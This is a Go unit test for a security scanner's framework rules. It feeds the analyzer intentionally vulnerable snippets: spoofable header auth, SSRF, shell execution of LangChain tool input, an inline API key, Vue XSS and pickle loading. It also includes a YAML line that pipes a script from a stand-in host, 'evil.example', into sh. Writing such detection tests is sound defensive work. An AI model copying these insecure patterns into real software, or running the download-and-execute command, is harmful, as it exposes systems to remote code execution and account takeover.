package detect

import "testing"

func TestFullStackFrameworkProfiles(t *testing.T) {
	analyzer := NewFrameworkAnalyzer()
	tests := []struct {
		name      string
		unit      string
		ruleID    string
		language  Language
		framework string
	}{
		{"nextjs route auth from input", "```ts\nimport { headers } from 'next/headers'\nexport async function GET() {\n  if (headers().get('x-admin') === 'true') return Response.json({ ok: true })\n}\n```", "cast.nextjs.route.auth-from-input", LanguageTypeScript, "nextjs"},
		{"react fetch from search params", "```tsx\nimport React from 'react'\nexport function Page({ searchParams }) {\n  return fetch(searchParams.url)\n}\n```", "cast.react.fetch.user-url", LanguageJavaScript, "react"},
		{"flask user from header", "```python\nfrom flask import Flask, request\napp = Flask(__name__)\ndef current_user():\n    user = request.headers.get('x-user')\n    return user\n```", "cast.flask.auth.user-from-header", LanguagePython, "flask"},
		{"django session user from input", "```python\nfrom django.http import HttpRequest\ndef login(request: HttpRequest):\n    request.session['user'] = request.POST\n```", "cast.django.session.user-from-input", LanguagePython, "django"},
		{"langchain exec from input", "```python\nfrom langchain.tools import tool\n@tool\ndef run_shell(query: str):\n    tool_input = query\n    return subprocess.run(tool_input, shell=True)\n```", "cast.langchain.tool.exec-from-input", LanguagePython, "langchain"},
		{"langgraph fetch from state", "```python\nfrom langgraph.graph import StateGraph\ndef node(state):\n    url = state['url']\n    return requests.get(url)\n```", "cast.langgraph.fetch-from-state", LanguagePython, "langgraph"},
		{"json config secret", "```json\n{\"api_key\": \"supersecretvalue123\"}\n```", "cast.json.secret.inline", LanguageJSON, "json-config"},
		{"yaml dangerous command", "```yaml\nrun: curl https://evil.example/install.sh | sh\n```", "cast.yaml.command.download-exec", LanguageYAML, "yaml-config"},
		{"vue v-html", "```vue\n<template><div v-html=\"route.query.html\"></div></template>\n```", "cast.vue.xss", LanguageJavaScript, "vue"},
		{"pandas read pickle", "```python\nimport pandas as pd\ndf = pd.read_pickle('data.pkl')\n```", "cast.pandas.read-pickle", LanguagePython, "pandas"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			findings := analyzer.Analyze(test.unit, ContentContextCodeBlock)
			assertFrameworkFinding(t, findings, test.ruleID, test.language, test.framework)
		})
	}
}
